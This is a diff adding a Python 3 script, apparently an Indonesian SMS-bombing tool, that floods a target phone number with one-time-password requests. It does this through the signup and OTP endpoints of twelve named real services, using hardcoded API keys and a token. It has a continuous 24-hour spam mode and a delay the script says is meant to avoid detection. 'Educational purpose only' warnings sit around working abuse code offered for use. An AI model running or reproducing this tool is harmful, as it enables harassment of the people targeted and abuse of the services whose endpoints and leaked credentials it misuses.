@@ -1,0 +1,547 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# ⚠️ WARNING: EDUCATIONAL PURPOSE ONLY ⚠️
+# Menggunakan script ini untuk spam adalah ILEGAL dan MELANGGAR HUKUM
+# Penggunaan untuk harassment dapat dikenai sanksi pidana
+
+# Original Creator: AmmarBN
+# Github: https://github.com/AmmarrBN
+# Powered By Executed Team
+# Updated to Python 3 with Debug Mode
+
+import os
+import sys
+import time
+import requests
+import json
+from datetime import datetime
+
+try:
+    from colorama import Fore, init, Style
+    init(autoreset=True)
+except ModuleNotFoundError:
+    print("Module colorama belum terinstall. Install dengan: pip3 install colorama requests")
+    sys.exit()
+
+# Warna dari Modules Colorama
+B = Fore.BLUE
+W = Fore.WHITE
+R = Fore.RED
+G = Fore.GREEN
+BL = Fore.BLACK
+Y = Fore.YELLOW
+M = Fore.MAGENTA
+C = Fore.CYAN
+
+# Warna tambahan
+Hijau = "\033[1;92m"
+putih = "\033[1;97m"
+abu = "\033[1;90m"
+kuning = "\033[1;93m"
+ungu = "\033[1;95m"
+merah = "\033[37;1m"
+biru = "\033[1;96m"
+
+# Debug mode
+DEBUG_MODE = False
+
+def log_debug(message, level="INFO"):
+    """Logging dengan timestamp"""
+    if DEBUG_MODE:
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        if level == "SUCCESS":
+            print(f"{G}[{timestamp}] [✓] {message}{W}")
+        elif level == "ERROR":
+            print(f"{R}[{timestamp}] [✗] {message}{W}")
+        elif level == "WARNING":
+            print(f"{Y}[{timestamp}] [!] {message}{W}")
+        else:
+            print(f"{C}[{timestamp}] [•] {message}{W}")
+
+def autoketik(s):
+    """Efek mengetik otomatis"""
+    for c in s + "\n":
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(0.001)
+
+def countdown(time_sec):
+    """Countdown timer dengan format menit:detik"""
+    try:
+        while time_sec:
+            mins, secs = divmod(time_sec, 60)
+            timeformat = f'\033[1;97m[\033[1;93m•\033[1;97m] Silakan Menunggu Dalam Waktu \033[1;92m{mins:02d}:{secs:02d}'
+            print(timeformat, end='\r')
+            time.sleep(1)
+            time_sec -= 1
+        print(f"{W}[{Y}•{W}] Mulai Menyepam Ulang....           ")
+        time.sleep(2)
+    except KeyboardInterrupt:
+        print(f"\n{W}Program Terminated [{R}!{W}]")
+        sys.exit()
+
+def tanya():
+    """Menu untuk kembali atau keluar"""
+    a = input(f"\n{W}[{Y}?{W}] Back Tools? ({Y}y{W}/{Y}t{W}){R} :{G} ")
+    if a.lower() == "y":
+        start()
+    elif a.lower() == "t":
+        print(f"{W}[{R}!{W}] Berhasil Keluar Dari Tools {R}!!!{W}")
+        sys.exit()
+    else:
+        print(f"{W}[{R}!{W}] Masukkan Pilihan Dengan Benar {R}!!!{W}")
+        sys.exit()
+
+def send_request(name, url, method="POST", headers=None, data=None, json_data=None):
+    """
+    Fungsi wrapper untuk mengirim request dengan debug info
+    """
+    try:
+        log_debug(f"Mengirim request ke {name}...", "INFO")
+        
+        if method == "POST":
+            if json_data:
+                response = requests.post(url, headers=headers, json=json_data, timeout=10)
+            else:
+                response = requests.post(url, headers=headers, data=data, timeout=10)
+        else:
+            response = requests.get(url, headers=headers, timeout=10)
+        
+        # Debug response
+        log_debug(f"{name} - Status Code: {response.status_code}", "INFO")
+        
+        if response.status_code in [200, 201, 202]:
+            log_debug(f"{name} - Response: {response.text[:100]}...", "SUCCESS")
+            return True, response.status_code
+        else:
+            log_debug(f"{name} - Failed: {response.text[:100]}...", "ERROR")
+            return False, response.status_code
+            
+    except requests.exceptions.Timeout:
+        log_debug(f"{name} - Timeout (> 10 detik)", "ERROR")
+        return False, "TIMEOUT"
+    except requests.exceptions.ConnectionError:
+        log_debug(f"{name} - Connection Error", "ERROR")
+        return False, "CONNECTION_ERROR"
+    except Exception as e:
+        log_debug(f"{name} - Error: {str(e)}", "ERROR")
+        return False, str(e)
+
+def send_sms_requests(nomor):
+    """Fungsi untuk mengirim request SMS OTP ke berbagai platform"""
+    results = {
+        "success": 0,
+        "failed": 0,
+        "total": 0
+    }
+    
+    print(f"\n{W}{'='*60}")
+    print(f"{Y}Memulai pengiriman SMS ke nomor: {G}0{nomor}{W}")
+    print(f"{W}{'='*60}\n")
+    
+    # 1. Ruparupa
+    success, code = send_request(
+        "Ruparupa",
+        "https://wapi.ruparupa.com/auth/generate-otp",
+        headers={
+            "Host": "wapi.ruparupa.com",
+            "content-type": "application/json",
+            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs",
+            "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+        },
+        json_data={
+            "phone": "0" + nomor,
+            "action": "register",
+            "channel": "message",
+            "email": "",
+            "token": "",
+            "customer_id": "0",
+            "is_resend": 0
+        }
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] Ruparupa - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] Ruparupa - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 2. Mapclub
+    success, code = send_request(
+        "Mapclub",
+        "https://beryllium.mapclub.com/api/member/registration/sms/otp",
+        headers={"content-type": "application/json"},
+        json_data={"account": nomor}
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] Mapclub - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] Mapclub - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 3. Dekoruma
+    success, code = send_request(
+        "Dekoruma",
+        "https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",
+        headers={"content-type": "application/json"},
+        json_data={"phoneNumber": "+62" + nomor, "platform": "sms"}
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] Dekoruma - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] Dekoruma - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 4. Jenius BTPN
+    success, code = send_request(
+        "Jenius",
+        "https://api.btpn.com/jenius",
+        headers={
+            "accept": "*/*",
+            "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
+            "Content-Type": "application/json",
+            "User-Agent": "okhttp/3.12.1"
+        },
+        json_data={
+            "query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n",
+            "variables": {"phone": "+62" + nomor, "language": "id"},
+            "operationName": "registerPhone"
+        }
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] Jenius - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] Jenius - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 5. Payfazz
+    success, code = send_request(
+        "Payfazz",
+        "https://api.payfazz.com/v2/phoneVerifications",
+        headers={
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36"
+        },
+        data={"phone": "0" + nomor}
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] Payfazz - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] Payfazz - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 6. Halodoc
+    success, code = send_request(
+        "Halodoc",
+        'https://www.halodoc.com/api/v1/users/authentication/otp/requests',
+        headers={'content-type': 'application/json'},
+        json_data={"phone_number": "+62" + nomor, "channel": "sms"}
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] Halodoc - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] Halodoc - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 7. Alodokter
+    success, code = send_request(
+        "Alodokter",
+        'https://www.alodokter.com/login-with-phone-number',
+        headers={'content-type': 'application/json'},
+        json_data={"user": {"phone": "0" + nomor}}
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] Alodokter - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] Alodokter - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 8. Pizza Hut
+    success, code = send_request(
+        "PizzaHut",
+        'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
+        headers={'content-type': 'application/json'},
+        json_data={
+            "email": "test" + nomor + "@gmail.com",
+            "first_name": "Test",
+            "last_name": "User",
+            "password": "Test123!",
+            "phone": "0" + nomor,
+            "birthday": "2000-01-01"
+        }
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] PizzaHut - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] PizzaHut - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 9. Tokko/Lummo
+    success, code = send_request(
+        "Tokko",
+        "https://api.tokko.io/graphql",
+        headers={"content-type": "application/json"},
+        json_data={
+            "operationName": "generateOTP",
+            "variables": {
+                "generateOtpInput": {
+                    "phoneNumber": "+62" + nomor,
+                    "hashCode": "",
+                    "channel": "SMS",
+                    "userType": "MERCHANT"
+                }
+            },
+            "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"
+        }
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] Tokko - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] Tokko - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 10. Ginee
+    success, code = send_request(
+        "Ginee",
+        "https://accounts.ginee.com/api/iam-service/account/send-verification-code",
+        headers={"content-type": "application/json"},
+        json_data={
+            "account": "0" + nomor,
+            "countryCode": "ID",
+            "verificationPurpose": "USER_REGISTRATION",
+            "verificationType": "PHONE"
+        }
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] Ginee - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] Ginee - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 11. Mister Aladin
+    success, code = send_request(
+        "MisterAladin",
+        "https://m.misteraladin.com/api/members/v2/otp/request",
+        headers={"content-type": "application/json"},
+        json_data={
+            "phone_number_country_code": "62",
+            "phone_number": nomor,
+            "type": "register"
+        }
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] MisterAladin - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] MisterAladin - Gagal ({R}{code}{W})")
+    
+    time.sleep(0.5)
+    
+    # 12. Blibli
+    success, code = send_request(
+        "Blibli",
+        "https://www.blibli.com/backend/common/users/_request-otp",
+        headers={"content-type": "application/json"},
+        json_data={"username": "0" + nomor}
+    )
+    results["total"] += 1
+    if success:
+        results["success"] += 1
+        print(f"{W}[{G}✓{W}] Blibli - Terkirim ({G}{code}{W})")
+    else:
+        results["failed"] += 1
+        print(f"{W}[{R}✗{W}] Blibli - Gagal ({R}{code}{W})")
+    
+    # Summary
+    print(f"\n{W}{'='*60}")
+    print(f"{W}Summary Pengiriman:")
+    print(f"{G}✓ Berhasil: {results['success']}/{results['total']}")
+    print(f"{R}✗ Gagal   : {results['failed']}/{results['total']}")
+    success_rate = (results['success'] / results['total'] * 100) if results['total'] > 0 else 0
+    print(f"{Y}Success Rate: {success_rate:.1f}%")
+    print(f"{W}{'='*60}\n")
+    
+    return results['success'] > 0
+
+def jam():
+    """Mode spam berkelanjutan dengan delay"""
+    try:
+        os.system("clear" if os.name == "posix" else "cls")
+        banner()
+        nomor = input(f"{W}[{R}?{W}] Masukkan Nomor Target {Y}:{G} ")
+        
+        print(f"\n{W}[{Y}!{W}] Mode spam 24 jam aktif (Ctrl+C untuk berhenti)")
+        print(f"{W}[{Y}!{W}] Delay 2 menit antar spam untuk menghindari deteksi\n")
+        
+        round_count = 1
+        while True:
+            print(f"{M}{'='*60}")
+            print(f"{M}Round #{round_count}")
+            print(f"{M}{'='*60}{W}")
+            
+            send_sms_requests(nomor)
+            round_count += 1
+            countdown(120)
+            
+    except KeyboardInterrupt:
+        print(f"\n{W}[{Y}!{W}] Spam dihentikan setelah {round_count-1} round")
+        tanya()
+
+def normal():
+    """Mode spam dengan jumlah tertentu"""
+    try:
+        os.system("clear" if os.name == "posix" else "cls")
+        banner()
+        nomor = input(f"{W}[{R}?{W}] Masukkan Nomor Target {Y}:{G} ")
+        jumlah = int(input(f"{W}[{R}?{W}] Masukkan Jumlah Spam {Y}:{G} "))
+        
+        for i in range(jumlah):
+            print(f"\n{M}{'='*60}")
+            print(f"{M}Spam Round {i+1}/{jumlah}")
+            print(f"{M}{'='*60}{W}")
+            
+            send_sms_requests(nomor)
+            
+            if i < jumlah - 1:  # Jangan delay setelah spam terakhir
+                countdown(120)
+        
+        print(f"\n{W}[{G}✓{W}] Selesai mengirim {jumlah} round spam")
+        tanya()
+        
+    except KeyboardInterrupt:
+        print(f"\n{W}[{Y}!{W}] Spam dihentikan")
+        tanya()
+    except ValueError:
+        print(f"{W}[{R}!{W}] Masukkan angka yang valid!")
+        time.sleep(2)
+        normal()
+
+def banner():
+    """Banner utama tools"""
+    try:
+        ip = requests.get('https://api.ipify.org', timeout=5).text
+    except:
+        ip = "Unknown"
+    
+    debug_status = f"{G}ON{W}" if DEBUG_MODE else f"{R}OFF{W}"
+    
+    autoketik(f"""
+             {biru}╔╗ {putih}┬─┐┬ ┬┌┬┐┌─┐┬        {ungu}╔═╗{putih}┌┬┐┌─┐
+             {biru}╠╩╗{putih}├┬┘│ │ │ ├─┤│  {R} ───  {ungu}╚═╗{putih}│││└─┐
+             {biru}╚═╝{putih}┴└─└─┘ ┴ ┴ ┴┴─┘      {ungu}╚═╝{putih}┴ ┴└─┘
+     \033[1;0m──────────────────────────┬─────────────────────────
+  \033[1;0m┌────────────────────────────┼───────────────────────────┐
+  {W}│ Creator{R}:{W}AmmarBN            │ Version {R}:{G} 3.0 (Py3){W}      │
+  {W}│ Github{R}:{G}github.com/AmmarrBN {W}│ {W}Your Ip {R}:{Y} {ip:<15}{W}│
+  {W}│ Team{R}:{W}Executed {biru}Team         {W}│ Debug Mode: {debug_status}         │
+  {W}│ {R}⚠ EDUCATIONAL PURPOSE ONLY ⚠                        {W}│
+  └────────────────────────────┼───────────────────────────┘""")
+
+def banner2():
+    """Menu pilihan"""
+    print(f"""{putih}           ┌───────────────────┴─────────┬──────────┐
+           {putih}│ 1{R}.{W}Spam 24 jam ({Y}delay 2 min{W})  │{G}  Online  {W}│
+           {putih}│ 2{R}.{W}Spam Normal ({Y}delay 2 min{W})  │{G}  Online  {W}│
+           {putih}│ 3{R}.{W}Toggle Debug Mode         │{G}  Active  {W}│
+           {putih}│ 4{R}.{W}Laporkan Bug              │{G}  Online  {W}│
+           {putih}│ 5{R}.{W}Exit Tools                │{R}  Exit    {W}│
+           {putih}└─────────────────────────────┴──────────┘""")
+
+def toggle_debug():
+    """Toggle debug mode"""
+    global DEBUG_MODE
+    DEBUG_MODE = not DEBUG_MODE
+    status = f"{G}AKTIF{W}" if DEBUG_MODE else f"{R}NONAKTIF{W}"
+    print(f"\n{W}[{Y}!{W}] Debug Mode sekarang {status}")
+    print(f"{W}[{Y}!{W}] Debug mode akan menampilkan detail response dari setiap API")
+    time.sleep(2)
+    start()
+
+def start():
+    """Memulai program"""
+    os.system("clear" if os.name == "posix" else "cls")
+    banner()
+    banner2()
+    
+    # Peringatan
+    print(f"\n{R}{'='*60}")
+    print(f"{R}⚠  PERINGATAN: Script ini hanya untuk EDUKASI")
+    print(f"{R}⚠  Penggunaan ilegal dapat dikenai sanksi HUKUM")
+    print(f"{R}⚠  Anda bertanggung jawab atas penggunaan tools ini")
+    print(f"{R}{'='*60}{W}\n")
+    
+    pil = input(f"        Input Number: ")
+    
+    if pil == "1":
+        jam()
+    elif pil == "2":
+        normal()
+    elif pil == "3":
+        toggle_debug()
+    elif pil == "4":
+        os.system("xdg-open https://www.instagram.com/ammarexecuted 2>/dev/null || open https://www.instagram.com/ammarexecuted")
+        print(f"{Y}${W} Terima Kasih Telah Menyampaikan Error, Creator Akan Segera Memperbaiki")
+        tanya()
+    elif pil == "5":
+        print(f"{W}[{R}!{W}] Exited Program")
+        sys.exit()
+    else:
+        print(f"{W}[{R}!{W}] Pilihan tidak valid!")
+        time.sleep(2)
+        start()
+
+if __name__ == "__main__":
+    try:
+        start()
+    except KeyboardInterrupt:
+        print(f"\n{W}[{R}!{W}] Program dihentikan oleh user")
+        sys.exit()
+    except Exception as e:
+        print(f"{W}[{R}!{W}] Error: {str(e)}")
+        sys.exit()
+
+# Copyright Updated to Python 3 with Debug Mode
+# Original by Executed Team ❤️ with AmmarBN
+# Python 3 conversion with enhanced debugging
